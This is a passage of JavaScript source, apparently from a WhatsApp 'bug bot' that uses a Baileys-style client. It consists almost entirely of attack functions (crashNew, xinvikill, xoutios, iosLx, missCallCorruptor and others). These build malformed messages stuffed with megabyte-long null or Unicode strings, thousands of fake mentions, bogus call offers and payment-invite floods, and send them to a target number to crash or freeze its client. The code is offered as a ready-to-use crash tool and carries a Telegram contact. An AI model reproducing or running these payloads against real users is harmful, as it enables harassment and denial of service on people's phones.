            }, {});            
            await XeonBotInc.relayMessage(X, msg.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
        }
    async function Delayhardtoya(target, mention = true ) {
    let sxo = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hello BODY DALEY.",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
   let sXoMessage = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const xso = generateWAMessageFromContent(target, sXoMessage, {});
      await XeonBotInc.relayMessage("status@broadcast", xso.message, {
        messageId: xso.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500)
     if (mention) {
        await XeonBotInc.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: xso.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await XeonBotInc.relayMessage("status@broadcast", sxo.message, {
        messageId: sxo.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500);
    if (mention) {
        await XeonBotInc.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: sxo.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    }
    //End The Toya 
async function missCallCorruptor(targetNumber) {
    // get all devices associated with this number
    let devices = (
        await XeonBotInc.getUSyncDevices([targetNumber], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await XeonBotInc.assertSessions(devices);

    // simple mutex lock for per-jid encryption
    let createMutex = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let mutexManager = createMutex();

    let randomKey = crypto.randomBytes(32);
    let randomKeyWithFlag = Buffer.concat([randomKey, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await XeonBotInc.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    // build call node (offer)
    let callNode = {
        tag: "call",
        attrs: {
            to: targetNumber,
            id: XeonBotInc.generateMessageTag(),
            from: XeonBotInc.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": XeonBotInc.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(XeonBotInc.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    await XeonBotInc.sendNode(callNode);
}


    async function xeonGalaxtos(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "@null", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "01096379348@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: `FLIX KILL 🩸🔫${"𑇂𑆵𑆴𑆿".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}
    
        
        async function  _labelStanza(X, Ptcp = false) {
			await XeonBotInc.relayMessage(X, {
					"extendedTextMessage": {
						"text": "memek" + "\u0000".repeat(999999),
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "5521992999999@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "5521992999999@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": X,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "201286008203@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "Telegram: @lo_tus_19",
								"body": "Telegram: @lo_tus_19",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/raditx7",
								"mediaUrl": "https://www.instagram.com/raditx7",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/raditx7"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "5521992999999-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "5521992999999-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "5521992999999@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {participant: { jid: X }}
			);
		};
		
		
		async function crashNew(target) {
    await XeonBotInc.relayMessage(target, {
        extendedTextMessage: {
            text: 'oi',
            contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: "5521992999999@s.whatsapp.net",
                callLogMessage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [{
                        jid: "5521992999999@s.whatsapp.net",
                        callOutcome: "1"
                    }]
                }
            }
        }
    }, {});
}

//==============================================================\\
async function xinvikill(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "Telegram: @lo_tus_19",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await XeonBotInc.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Telegram: @lo_tus_19" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function xinvikill2(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@lo_tus_19",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "Telegram: @lo_tus_19" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "Telegram: @lo_tus_19"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await XeonBotInc.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await XeonBotInc.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "Telegram: @lo_tus_19" },
content: undefined
}
]
}
);
}
}
//==============================================================\\
async function xoutdroid(target) {
  try {
    const contextInfo = {
      mentionedJid: [target],
      isForwarded: true,
      forwardingScore: 999,
      businessMessageForwardInfo: {
        businessOwnerJid: target
      }
    };

    let messagePayload = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            contextInfo,
            body: {
              text: "Telegram: @lo_tus_19" + "\u0000".repeat(900000)
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: bugXeonContent + "\u0003" },
                { name: "call_permission_request", buttonParamsJson: bugXeonContent + "\u0003" },
                { name: "mpm", buttonParamsJson: bugXeonContent + "\u0003" },
                { name: "mpm", buttonParamsJson: bugXeonContent + "\u0003" },
                { name: "mpm", buttonParamsJson: bugXeonContent + "\u0003" },
                { name: "mpm", buttonParamsJson: bugXeonContent + "\u0003" }
              ]
            }
          }
        }
      }
    };

    await XeonBotInc.relayMessage(target, messagePayload, { participant: { jid: target } });
  } catch (err) {
    console.error(err);
  }
}

let bugXeonContent = JSON.stringify({
    status: true,
    criador: "Telegram: @lo_tus_19",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
//==============================================================\\
async function iosLx(target) {
  for(let z = 0; z < 100; z++) {
    await XeonBotInc.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: `🧪⃟꙰。⌁Telegram@lo_tus_19` + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/VIP_1XB",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: ZeppImg, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
    await sleep(9000);
  }
}

async function xoutios(target) {
    const xeonIpong = "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @lo_tus_19","flow_id":"Telegram: @lo_tus_19","flow_message_version":"9.903","flow_token":"Telegram: @lo_tus_19"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @lo_tus_19" }]
                    }
                }
            }
        }
    }), { userJid: target });

    const msg1 = await genMsg(`${xeonIpong}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await XeonBotInc.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("Telegram: @lo_tus_19", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await XeonBotInc.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: xeonIpong,
            url: "https://youtube.com/@ "
        }
    }, { participant: { jid: target } });

await XeonBotInc.relayMessage(target, {
        'extendedTextMessage': {
            'text': xeonIpong,
            'contextInfo': {
                'stanzaId': target,
                'participant': target,
                'quotedMessage': {
                    'conversation': 'Telegram: @lo_tus_19' + 'ꦾ'.repeat(50000)
                },
                'disappearingMode': {
                    'initiator': "CHANGED_IN_CHAT",
                    'trigger': "CHAT_SETTING"
                }
            },
            'inviteLinkGroupTypeV2': "DEFAULT"
        }
    }, {
        'participant': {
            'jid': target
        }
    }, {
        'messageId': null
    });

    const paymentMsg = service => ({
    paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
    }
});

function generateEncryptedID(service) {
    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
}

for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "samSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await XeonBotInc.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
    });
}
    
    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @lo_tus_19" + xeonIpong,
            url: "https://youtube.com/@DGXeom"
        }
    }, { participant: { jid: target } });
    
    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @lo_tus_19" + xeonIpong,
            url: "https://youtube.com/@ "
        }
    }, { participant: { jid: target } });
}
//==============================================================\\
async function xoutdroid2(target) {
let xeonCok = JSON.stringify({
status: true,
criador: "Telegram: @lo_tus_19",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const contextInfo = {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "Telegram: @lo_tus_19",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: xeonCok + "Telegram: @lo_tus_19",},
{ name: "call_permission_request", buttonParamsJson: xeonCok + "\u0003",},
]
}
}
}
}
};

await XeonBotInc.relayMessage(target, messagePayload, { participant: { jid: target } });
}
//==============================================================\\
async function xeonOutBrutal2(target) {
let xeonOutBrutal2 = JSON.stringify({
status: true,
criador: "Telegram: @lo_tus_19",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
try {
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
},
body: {
text: "Telegram: @lo_tus_19",
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @lo_tus_19",
},
{
name: "call_permission_request",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @lo_tus_19",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @lo_tus_19",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @lo_tus_19",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @lo_tus_19",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @lo_tus_19",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @lo_tus_19",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @lo_tus_19",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @lo_tus_19",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @lo_tus_19",
},
],
},
},
},
},
};

await XeonBotInc.relayMessage(target, message, {
participant: { jid: target },
});
} catch (err) {
console.log(err);
}
}
//==============================================================\\
async function xeonOutBrutal(target) {
  let xeonOrWhat = JSON.stringify({
    status: true,
    criador: "Telegram: @lo_tus_19",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
